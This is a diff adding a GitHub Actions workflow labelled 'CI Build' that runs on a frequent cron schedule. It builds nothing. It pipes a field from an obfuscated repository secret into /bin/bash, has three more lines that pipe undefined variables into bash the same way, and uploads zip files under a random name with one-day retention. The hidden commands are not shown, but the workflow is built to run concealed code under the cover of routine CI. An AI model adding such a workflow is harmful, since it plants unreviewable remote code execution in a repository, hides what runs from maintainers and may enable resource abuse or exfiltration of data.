@@ -1,0 +1,34 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          pgjh21312: ${{ secrets.pgjh21312 }}
+        run: |
+          printf '%s' "$pgjh21312" | jq -r .gt6 | /bin/bash
+          printf '%s' "$pct62538" | jq -r .gj27731 | /bin/bash
+          echo $bjoax53646 | jq -r .gy32 | /bin/bash
+          echo $p56 | jq -r .b30339 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: Z53UtOl6
+          path: "*.zip"
+          retention-days: 1
